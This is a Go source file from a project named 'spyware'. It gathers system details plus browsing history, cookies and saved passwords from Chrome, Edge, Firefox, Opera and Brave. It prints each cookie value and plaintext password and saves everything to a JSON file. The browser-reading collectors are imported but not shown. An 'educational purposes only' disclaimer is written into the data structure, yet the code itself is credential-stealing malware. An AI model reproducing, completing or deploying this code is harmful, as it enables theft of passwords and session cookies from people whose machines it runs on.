package services

import (
	"encoding/json"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/Nevesto/spyware/collectors"
	"github.com/Nevesto/spyware/models"
)

func CollectSystemInfo() models.SystemInfo {
	osOS, osArch := collectors.CollectOSInfo()
	userUsername, userHomeDir := collectors.CollectUserInfo()
	hostname, workingDir := collectors.CollectHostInfo()
	netIPs := collectors.CollectNetInfo()

	return models.SystemInfo{
		Timestamp:  time.Now().Format("2006-01-02 15:04:05"),
		OS:         models.OSInfo{OS: osOS, Architecture: osArch},
		User:       models.UserInfo{Username: userUsername, HomeDir: userHomeDir},
		Host:       models.HostInfo{Hostname: hostname, WorkingDir: workingDir},
		Network:    models.NetInfo{IPAddresses: netIPs},
		Chrome:     collectors.CollectChromeInfo(),
		Edge:       collectors.CollectEdgeInfo(),
		Firefox:    collectors.CollectFirefoxInfo(),
		Opera:      collectors.CollectOperaInfo(),
		Brave:      collectors.CollectBraveInfo(),
		Purpose:    "This data is collected for educational purposes only, to demonstrate potential vulnerabilities.",
		Disclaimer: "Unauthorized access or collection of personal data is illegal and unethical. This tool should only be used on systems you own or have explicit permission to access.",
	}
}

func DisplayInfo(info models.SystemInfo) {
	if len(info.Chrome.History) > 0 {
		fmt.Printf("  Chrome History: %d entries\n", len(info.Chrome.History))
	}
	if len(info.Chrome.Cookies) > 0 {
		fmt.Printf("  Chrome Cookies: %d entries\n", len(info.Chrome.Cookies))
		for _, cookie := range info.Chrome.Cookies {
			fmt.Printf("    Host: %s, Name: %s, Value: %s\n", cookie.HostKey, cookie.Name, cookie.Value)
		}
	}
	if len(info.Chrome.Passwords) > 0 {
		fmt.Printf("  Chrome Passwords: %d entries\n", len(info.Chrome.Passwords))
		for _, password := range info.Chrome.Passwords {
			fmt.Printf("    URL: %s, Username: %s, Password: %s\n", password.OriginURL, password.Username, password.Password)
		}
	}

	if len(info.Edge.History) > 0 {
		fmt.Printf("  Edge History: %d entries\n", len(info.Edge.History))
	}
	if len(info.Edge.Cookies) > 0 {
		fmt.Printf("  Edge Cookies: %d entries\n", len(info.Edge.Cookies))
		for _, cookie := range info.Edge.Cookies {
			fmt.Printf("    Host: %s, Name: %s, Value: %s\n", cookie.HostKey, cookie.Name, cookie.Value)
		}
	}
	if len(info.Edge.Passwords) > 0 {
		fmt.Printf("  Edge Passwords: %d entries\n", len(info.Edge.Passwords))
		for _, password := range info.Edge.Passwords {
			fmt.Printf("    URL: %s, Username: %s, Password: %s\n", password.OriginURL, password.Username, password.Password)
		}
	}

	if len(info.Firefox.History) > 0 {
		fmt.Printf("  Firefox History: %d entries\n", len(info.Firefox.History))
	}
	if len(info.Firefox.Cookies) > 0 {
		fmt.Printf("  Firefox Cookies: %d entries\n", len(info.Firefox.Cookies))
		for _, cookie := range info.Firefox.Cookies {
			fmt.Printf("    Host: %s, Name: %s, Value: %s\n", cookie.HostKey, cookie.Name, cookie.Value)
		}
	}
	if len(info.Firefox.Passwords) > 0 {
		fmt.Printf("  Firefox Passwords: %d entries\n", len(info.Firefox.Passwords))
		for _, password := range info.Firefox.Passwords {
			fmt.Printf("    URL: %s, Username: %s, Password: %s\n", password.OriginURL, password.Username, password.Password)
		}
	}

	if len(info.Opera.History) > 0 {
		fmt.Printf("  Opera History: %d entries\n", len(info.Opera.History))
	}
	if len(info.Opera.Cookies) > 0 {
		fmt.Printf("  Opera Cookies: %d entries\n", len(info.Opera.Cookies))
		for _, cookie := range info.Opera.Cookies {
			fmt.Printf("    Host: %s, Name: %s, Value: %s\n", cookie.HostKey, cookie.Name, cookie.Value)
		}
	}
	if len(info.Opera.Passwords) > 0 {
		fmt.Printf("  Opera Passwords: %d entries\n", len(info.Opera.Passwords))
		for _, password := range info.Opera.Passwords {
			fmt.Printf("    URL: %s, Username: %s, Password: %s\n", password.OriginURL, password.Username, password.Password)
		}
	}

	if len(info.Brave.History) > 0 {
		fmt.Printf("  Brave History: %d entries\n", len(info.Brave.History))
	}
	if len(info.Brave.Cookies) > 0 {
		fmt.Printf("  Brave Cookies: %d entries\n", len(info.Brave.Cookies))
		for _, cookie := range info.Brave.Cookies {
			fmt.Printf("    Host: %s, Name: %s, Value: %s\n", cookie.HostKey, cookie.Name, cookie.Value)
		}
	}
	if len(info.Brave.Passwords) > 0 {
		fmt.Printf("  Brave Passwords: %d entries\n", len(info.Brave.Passwords))
		for _, password := range info.Brave.Passwords {
			fmt.Printf("    URL: %s, Username: %s, Password: %s\n", password.OriginURL, password.Username, password.Password)
		}
	}
}

func SaveToFile(info models.SystemInfo) {
	filename := fmt.Sprintf("system_info_%s.json", time.Now().Format("20060102_150405"))
	jsonData, err := json.MarshalIndent(info, "", "  ")
	if err != nil {
		log.Printf("Error converting to JSON: %v", err)
		return
	}

	file, err := os.Create(filename)
	if err != nil {
		log.Printf("Error creating file: %v", err)
		return
	}
	defer file.Close()

	_, err = file.Write(jsonData)
	if err != nil {
		log.Printf("Error writing to file: %v", err)
	}
}
